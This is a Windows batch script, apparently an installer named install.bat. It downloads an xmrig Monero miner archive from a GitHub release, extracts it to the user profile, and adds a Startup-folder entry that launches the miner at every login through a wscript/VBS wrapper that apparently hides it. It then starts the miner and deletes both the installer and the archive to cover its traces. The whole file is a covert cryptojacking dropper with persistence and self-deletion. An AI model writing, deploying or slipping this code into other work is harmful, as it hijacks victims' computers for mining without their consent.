@echo off
setlocal

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/JCionx/xmrig/releases/download/v1.0/xmrig.zip' -OutFile 'xmrig.zip'"

mkdir "%USERPROFILE%\XMR"

powershell -Command "Expand-Archive -Path 'xmrig.zip' -DestinationPath '%USERPROFILE%\XMR'"

set startupFolder=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
set startupFile=%startupFolder%\start_xmrig.bat

echo wscript.exe "%USERPROFILE%\XMR\inv.vbs" "%USERPROFILE%\XMR\xmrig.exe" > "%startupFile%"

call "%startupFile%"

endlocal

del "%USERPROFILE%\Desktop\install.bat"
del "xmrig.zip"

exit
